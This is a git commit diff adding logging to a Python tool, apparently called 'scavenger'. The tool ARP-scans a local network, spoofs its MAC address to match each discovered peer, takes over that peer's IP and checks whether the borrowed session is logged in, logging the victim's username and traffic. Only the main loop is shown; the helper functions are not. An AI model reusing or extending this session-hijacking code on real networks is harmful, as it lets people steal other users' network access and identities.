89209b1e18323bd45ec78cd82d7bfe9300b1a25c
ThomasLee <lisihan969@gmail.com>
2015-03-12 10:25:27 +0800

    Bug fixed, add more logging

--- scavenger/main.py
+++ scavenger/main.py
@@ -11,7 +11,9 @@ def target_scaner(interface, min_interval=30):
     while True:
         begin_time = time()
         peers = {}
-        for ip, mac in arp_scaner():
+
+        logger.info('Scanning targets...')
+        for ip, mac in arp_scanner(interface):
             peers[ip] = mac
             if ip in old_peers:  # Still online
                 del old_peers[ip]  # Remove it from old_peers
@@ -29,21 +31,30 @@ def target_scaner(interface, min_interval=30):
         
 def try_target(target, interface, max_attempts=5, sleep_time=5):
     ip, mac = target
-    logger.info("Trying target: %s, %s", ip, mac)
+    logger.info('Trying target: %s, %s', ip, mac)
 
     if not spoof_mac(mac, interface):  # Failed to spoof mac
+        logger.error('Failed to spoof the mac of %s to %s', interface, mac)
         return False
 
     for i in range(max_attempts):
+        logger.info('Checking IP in %d s (attempt %d)', sleep_time, i)
         sleep(sleep_time)
-        if get_ip() == ip:
+
+        self_ip = get_ip()
+        logger.info('IP now: %s', self_ip)
+        if self_ip == ip:
             break
     else:  # Failed to get this IP
+        logger.error('Failed to grab the IP %s', ip)
         return False
 
     infos = check_online()
     if infos:  # Succeeded
+        logger.info('Got IP %s (%s, %s B, %s s)', ip,
+                    infos['username'], infos['byte'], infos['duration'])
         return infos
     else:  # An offline IP
+        logger.info('IP %s not online', ip)
         return False
 
